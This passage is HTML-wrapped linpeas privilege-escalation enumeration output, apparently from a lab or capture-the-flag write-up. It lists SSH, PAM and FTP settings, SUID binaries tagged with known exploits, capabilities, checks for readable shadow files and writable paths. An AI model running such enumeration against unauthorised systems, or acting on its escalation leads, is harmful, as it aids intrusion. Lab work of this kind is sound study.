class="line"><span class="string">/etc/ssl/certs/Baltimore_CyberTrust_Root.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Buypass_Class_2_Root_CA.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/Buypass_Class_3_Root_CA.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/CA_Disig_Root_R2.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/CFCA_EV_ROOT.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/COMODO_Certification_Authority.pem</span></span><br><span class="line"><span class="string">/etc/ssl/certs/COMODO_ECC_Certification_Authority.pem</span></span><br><span class="line"><span class="string">2431PSTORAGE_CERTSBIN</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">══╣ Some home ssh config file was found</span></span><br><span class="line"><span class="string">/usr/share/openssh/sshd_config                                                                                                </span></span><br><span class="line"><span class="string">ChallengeResponseAuthentication no</span></span><br><span class="line"><span class="string">UsePAM yes</span></span><br><span class="line"><span class="string">X11Forwarding yes</span></span><br><span class="line"><span class="string">PrintMotd no</span></span><br><span class="line"><span class="string">AcceptEnv LANG LC_*</span></span><br><span class="line"><span class="string">Subsystem       sftp    /usr/lib/openssh/sftp-server</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">══╣ /etc/hosts.allow file found, trying to read the rules:</span></span><br><span class="line"><span class="string">/etc/hosts.allow                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Searching inside /etc/ssh/ssh_config for interesting info</span></span><br><span class="line"><span class="string">Host *</span></span><br><span class="line"><span class="string">    SendEnv LANG LC_*</span></span><br><span class="line"><span class="string">    HashKnownHosts yes</span></span><br><span class="line"><span class="string">    GSSAPIAuthentication yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing PAM Auth Files (limit 70)</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /etc/pam.d                                                                           </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2133 Jan 31  2020 /etc/pam.d/sshd</span></span><br><span class="line"><span class="string">account    required     pam_nologin.so</span></span><br><span class="line"><span class="string">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close</span></span><br><span class="line"><span class="string">session    required     pam_loginuid.so</span></span><br><span class="line"><span class="string">session    optional     pam_keyinit.so force revoke</span></span><br><span class="line"><span class="string">session    optional     pam_motd.so  motd=/run/motd.dynamic</span></span><br><span class="line"><span class="string">session    optional     pam_motd.so noupdate</span></span><br><span class="line"><span class="string">session    optional     pam_mail.so standard noenv # [1]</span></span><br><span class="line"><span class="string">session    required     pam_limits.so</span></span><br><span class="line"><span class="string">session    required     pam_env.so # [1]</span></span><br><span class="line"><span class="string">session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale</span></span><br><span class="line"><span class="string">session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Keyring Files (limit 70)</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 May 29  2021 /usr/share/keyrings                                                                  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching uncommon passwd files (splunk)</span></span><br><span class="line"><span class="string">passwd file: /etc/pam.d/passwd                                                                                                </span></span><br><span class="line"><span class="string">passwd file: /etc/passwd</span></span><br><span class="line"><span class="string">passwd file: /usr/share/bash-completion/completions/passwd</span></span><br><span class="line"><span class="string">passwd file: /usr/share/lintian/overrides/passwd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Github Files (limit 70)</span></span><br><span class="line"><span class="string">drwxr-xr-x 3 root root 4096 Oct 15  2020 /usr/share/phpmyadmin/vendor/google/recaptcha/.github                                </span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 Oct 15  2020 /usr/share/phpmyadmin/vendor/phpmyadmin/motranslator/.github</span></span><br><span class="line"><span class="string">drwxr-xr-x 2 root root 4096 Oct 15  2020 /usr/share/phpmyadmin/vendor/tecnickcom/tcpdf/.github</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing PGP-GPG Files (limit 70)</span></span><br><span class="line"><span class="string">gpg Not Found                                                                                                                 </span></span><br><span class="line"><span class="string">netpgpkeys Not Found                                                                                                          </span></span><br><span class="line"><span class="string">netpgp Not Found                                                                                                              </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8700 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8709 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2453 Mar 16  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8132 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8141 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2332 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7443 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7452 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2263 Apr 23  2019 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8700 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8709 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2453 Mar 16  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8132 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 8141 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2332 Mar 16  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 55625 Mar 16  2021 /usr/share/keyrings/debian-archive-keyring.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 36873 Mar 16  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7443 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 7452 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 2263 Mar 16  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Postfix Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 675 Mar  1  2019 /usr/share/bash-completion/completions/postfix                                        </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing FTP Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 5851 May 29  2021 /etc/vsftpd.conf                                                                     </span></span><br><span class="line"><span class="string">anonymous_enable=YES</span></span><br><span class="line"><span class="string">local_enable=YES</span></span><br><span class="line"><span class="string">#write_enable=YES</span></span><br><span class="line"><span class="string">#anon_upload_enable=YES</span></span><br><span class="line"><span class="string">#anon_mkdir_write_enable=YES</span></span><br><span class="line"><span class="string">#chown_uploads=YES</span></span><br><span class="line"><span class="string">#chown_username=whoever</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 41 Jun 18  2015 /usr/lib/tmpfiles.d/vsftpd.conf</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 506 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE/vsftpd.conf</span></span><br><span class="line"><span class="string">anonymous_enable</span></span><br><span class="line"><span class="string">local_enable</span></span><br><span class="line"><span class="string">write_enable</span></span><br><span class="line"><span class="string">anon_upload_enable</span></span><br><span class="line"><span class="string">anon_mkdir_write_enable</span></span><br><span class="line"><span class="string">anon_other_write_enable</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 564 Mar  6  2019 /usr/share/doc/vsftpd/examples/INTERNET_SITE_NOINETD/vsftpd.conf</span></span><br><span class="line"><span class="string">anonymous_enable</span></span><br><span class="line"><span class="string">local_enable</span></span><br><span class="line"><span class="string">write_enable</span></span><br><span class="line"><span class="string">anon_upload_enable</span></span><br><span class="line"><span class="string">anon_mkdir_write_enable</span></span><br><span class="line"><span class="string">anon_other_write_enable</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 260 Feb  1  2008 /usr/share/doc/vsftpd/examples/VIRTUAL_USERS/vsftpd.conf</span></span><br><span class="line"><span class="string">anonymous_enable</span></span><br><span class="line"><span class="string">local_enable=YES</span></span><br><span class="line"><span class="string">write_enable</span></span><br><span class="line"><span class="string">anon_upload_enable</span></span><br><span class="line"><span class="string">anon_mkdir_write_enable</span></span><br><span class="line"><span class="string">anon_other_write_enable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 69 Feb 13  2021 /etc/php/7.3/mods-available/ftp.ini</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 69 Feb 13  2021 /usr/share/php7.3-common/common/ftp.ini</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing DNS Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 856 Mar  1  2019 /usr/share/bash-completion/completions/bind                                           </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 856 Mar  1  2019 /usr/share/bash-completion/completions/bind</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Windows Files (limit 70)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 22 May 29  2021 /etc/alternatives/my.cnf -&gt; /etc/mysql/mariadb.cnf</span></span><br><span class="line"><span class="string">lrwxrwxrwx 1 root root 24 May 29  2021 /etc/mysql/my.cnf -&gt; /etc/alternatives/my.cnf</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 83 May 29  2021 /var/lib/dpkg/alternatives/my.cnf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Analyzing Other Interesting Files (limit 70)</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 3526 Apr 18  2019 /etc/skel/.bashrc                                                                    </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 grimmie administrator 3526 May 29  2021 /home/grimmie/.bashrc</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 807 Apr 18  2019 /etc/skel/.profile</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 grimmie administrator 807 May 29  2021 /home/grimmie/.profile</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                      ╔════════════════════════════════════╗</span></span><br><span class="line"><span class="string">══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                            </span></span><br><span class="line"><span class="string">                      ╚════════════════════════════════════╝                                                                  </span></span><br><span class="line"><span class="string">╔══════════╣ SUID - Check easy privesc, exploits and write perms</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              </span></span><br><span class="line"><span class="string">strings Not Found                                                                                                             </span></span><br><span class="line"><span class="string">strace Not Found                                                                                                              </span></span><br><span class="line"><span class="string">-rwsr-xr-- 1 root messagebus 50K Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                     </span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 427K Jan 31  2020 /usr/lib/openssh/ssh-keysign</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 53K Jul 27  2018 /usr/bin/chfn  ---&gt;  SuSE_9.3/10</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 51K Jan 10  2019 /usr/bin/mount  ---&gt;  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/newgrp  ---&gt;  HP-UX_10.20</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 35K Jan 10  2019 /usr/bin/umount  ---&gt;  BSD/Linux(08-1996)</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 44K Jul 27  2018 /usr/bin/chsh</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 63K Jul 27  2018 /usr/bin/passwd  ---&gt;  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)                                                                                                      </span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 63K Jan 10  2019 /usr/bin/su</span></span><br><span class="line"><span class="string">-rwsr-xr-x 1 root root 83K Jul 27  2018 /usr/bin/gpasswd</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ SGID</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                              </span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root shadow 39K Feb 14  2019 /usr/sbin/unix_chkpwd                                                               </span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root tty 15K May  4  2018 /usr/bin/bsd-write</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root shadow 31K Jul 27  2018 /usr/bin/expiry</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root tty 35K Jan 10  2019 /usr/bin/wall</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root crontab 43K Oct 11  2019 /usr/bin/crontab</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root mail 19K Dec  3  2017 /usr/bin/dotlockfile</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root shadow 71K Jul 27  2018 /usr/bin/chage</span></span><br><span class="line"><span class="string">-rwxr-sr-x 1 root ssh 315K Jan 31  2020 /usr/bin/ssh-agent</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Checking misconfigurations of ld.so</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                      </span></span><br><span class="line"><span class="string">/etc/ld.so.conf                                                                                                               </span></span><br><span class="line"><span class="string">Content of /etc/ld.so.conf:                                                                                                   </span></span><br><span class="line"><span class="string">include /etc/ld.so.conf.d/*.conf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/ld.so.conf.d</span></span><br><span class="line"><span class="string">  /etc/ld.so.conf.d/libc.conf                                                                                                 </span></span><br><span class="line"><span class="string">  - /usr/local/lib                                                                                                            </span></span><br><span class="line"><span class="string">  /etc/ld.so.conf.d/x86_64-linux-gnu.conf</span></span><br><span class="line"><span class="string">  - /usr/local/lib/x86_64-linux-gnu                                                                                           </span></span><br><span class="line"><span class="string">  - /lib/x86_64-linux-gnu</span></span><br><span class="line"><span class="string">  - /usr/lib/x86_64-linux-gnu</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/etc/ld.so.preload</span></span><br><span class="line"><span class="string">╔══════════╣ Capabilities                                                                                                     </span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                               </span></span><br><span class="line"><span class="string">══╣ Current shell capabilities                                                                                                </span></span><br><span class="line"><span class="string">CapInh:  0x0000000000000000=                                                                                                  </span></span><br><span class="line"><span class="string">CapPrm:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapEff:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span></span><br><span class="line"><span class="string">CapAmb:  0x0000000000000000=</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">══╣ Parent process capabilities</span></span><br><span class="line"><span class="string">CapInh:  0x0000000000000000=                                                                                                  </span></span><br><span class="line"><span class="string">CapPrm:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapEff:  0x0000000000000000=</span></span><br><span class="line"><span class="string">CapBnd:  0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read</span></span><br><span class="line"><span class="string">CapAmb:  0x0000000000000000=</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Files with capabilities (limited to 50):</span></span><br><span class="line"><span class="string">/usr/bin/ping = cap_net_raw+ep</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ AppArmor binary profiles</span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root 3129 Feb 10  2019 usr.bin.man                                                                          </span></span><br><span class="line"><span class="string">-rw-r--r-- 1 root root  730 Nov 25  2020 usr.sbin.mysqld</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Files with ACLs (limited to 50)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                       </span></span><br><span class="line"><span class="string">files with acls in searched folders Not Found                                                                                 </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Files (scripts) in /etc/profile.d/</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                             </span></span><br><span class="line"><span class="string">total 20                                                                                                                      </span></span><br><span class="line"><span class="string">drwxr-xr-x  2 root root 4096 May 29  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x 74 root root 4096 Feb 15 14:08 ..</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  664 Mar  1  2019 bash_completion.sh</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root 1107 Sep 14  2018 gawk.csh</span></span><br><span class="line"><span class="string">-rw-r--r--  1 root root  757 Sep 14  2018 gawk.sh</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Permissions in init, init.d, systemd, and rc.d</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                               </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">═╣ Hashes inside passwd file? ........... No</span></span><br><span class="line"><span class="string">═╣ Writable passwd file? ................ No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Credentials in fstab/mtab? ........... No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read shadow files? ............. No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read shadow plists? ............ No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I write shadow plists? ........... No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read opasswd file? ............. No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I write in network-scripts? ...... No                                                                                  </span></span><br><span class="line"><span class="string">═╣ Can I read root folder? .............. No                                                                                  </span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Searching root files in home dirs (limit 30)</span></span><br><span class="line"><span class="string">/home/                                                                                                                        </span></span><br><span class="line"><span class="string">/root/</span></span><br><span class="line"><span class="string">/var/www</span></span><br><span class="line"><span class="string">/var/www/html</span></span><br><span class="line"><span class="string">/var/www/html/index.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">╔══════════╣ Searching folders owned by me containing others files on it (limit 100)</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Readable files belonging to root and readable by me but not world readable</span></span><br><span class="line"><span class="string">                                                                                                                              </span></span><br><span class="line"><span class="string">╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)</span></span><br><span class="line"><span class="string">╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                             </span></span><br><span class="line"><span class="string">/dev/mqueue                                                                                                                   </span></span><br><span class="line"><span class="string">/dev/shm</span></span><br><span class="line"><span class="string">/run/lock</span></span><br><span class="line"><span class="string">/run/lock/apache2</span></span><br><span class="line"><span class="string">/tmp</span></span><br><span class="line"><span class="string">/tmp/linpeas.sh</span></span><br><span class="line"><span class="string">/var/cache/apache2/mod_cache_disk</span></span><br><span class="line"><span class="string">/var/lib/php/sessions</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/15</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/15/15a885ca9738e5a84084a3e52f1f6b23c771ea4f7bdca01081f7b87d3b86a6f9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/21</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/21/21a3bee2bc40466295b888b9fec6fb9d77882a7cf061fd3f3d7194b5d54ab837.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/22</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/22/22f328e86274b51eb9034592ac106d133734cc8f4fba3637fe76b0a4b958f16d.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/28</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/28/28bcfd31671cb4e1cff7084a80ef5574315cd27a4f33c530bc9ae8da8934caf6.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/2e</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/2e/2e6ed961bffa8943f6419f806fe7bfc2232df52e39c5880878e7f34aae869dd9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/31</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/31/317c8816ee34910f2c19f0c2bd6f261441aea2562acc0463975f80a4f0ed98a9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/36</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/36/360a7a01227c90acf0a097d75488841f91dc2939cebca8ee28845b8abccb62ee.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/3b</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/3b/3bf8a6b93e8c4961d320a65db6c6f551428da6ae8b8e0c87200629b4ddad332d.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/41</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/41/4161342482a4d1436d31f5619bbdbd176c50e500207e3f364662f5ba8210fe31.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/42</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/42/426cadcf834dab31a9c871f8a7c8eafa83f4c66a2297cfefa7aae7a7895fa955.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/43</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/43/43cb8c5a42f17f780372a6d8b976cafccd1f95b8656d9d9638fca2bb2c0c1ee6.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4c</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4c/4c13e8023eae0535704510f289140d5447e25e2dea14eaef5988afa2ae915cb9.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4e</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4e/4e68050e4aec7ca6cfa1665dd465a55a5d643fca6abb104a310e5145d7310851.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4e/4e8f70ab052f0a5513536d20f156e0649e1791c083804a629624d2cb1e052f1f.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4f</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/4f/4f7c1ace051b6b8cb85528aa8aef0052b72277f654cb4f13f2fc063f8529efe4.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/53</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/53/53ec6cf1deb6f8f805eb3077b06e6ef3b7805e25082d74c09563f91a11c1dfcd.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/5c</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/5c/5cf13d5a4ba7434d92bc44defee51a93cfbafa0d7984fcb8cbea606d97fe3e1a.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/61</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/61/61cf92e037fb131bad1ea24485b8e2ab7f0dd05dbe0bcdec85d8a96c80458223.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6b</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6b/6b8deef855b316d17c87795aebdf5aa33b55fae3e6c453d2a5bab7c4085f85d7.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6c</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/6c/6c9a7cd11578d393beebc51daa9a48d35c8b03d3a69fd786c55ceedf71a62d29.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/73</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/73/73a22388ea06dda0a2e91e156573fc4c47961ae6e35817742bb6901eb91d5478.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/73/73ee99e209023ff62597f3f6e5f027a498c1261e4d35d310b0d0a2664f3c2c0d.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/78</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/78/786fc5d49e751f699117fbb46b2e5920f5cdae9b5b3e7bb04e39d201b9048164.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7d</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7d/7d8087d41c482579730682151ac3393f13b0506f63d25d3b07db85fcba5cdbeb.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7f</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/7f/7f2fea86c14cdbd8cd63e93670d9fef0c3d91595972a398d9aa8d5d919c9aa63.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8a</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8a/8a16ca4dbbd4143d994e5b20d8e1e088f482b5a41bf77d34526b36523fc966d7.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8b</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/8b/8b3d6e41c7dc114088cc4febcf99864574a28c46ce39fd02d9577bec9ce900de.php</span></span><br><span class="line"><span class="string">/var/lib/phpmyadmin/tmp/twig/96</span></span><br><span class="line"><span 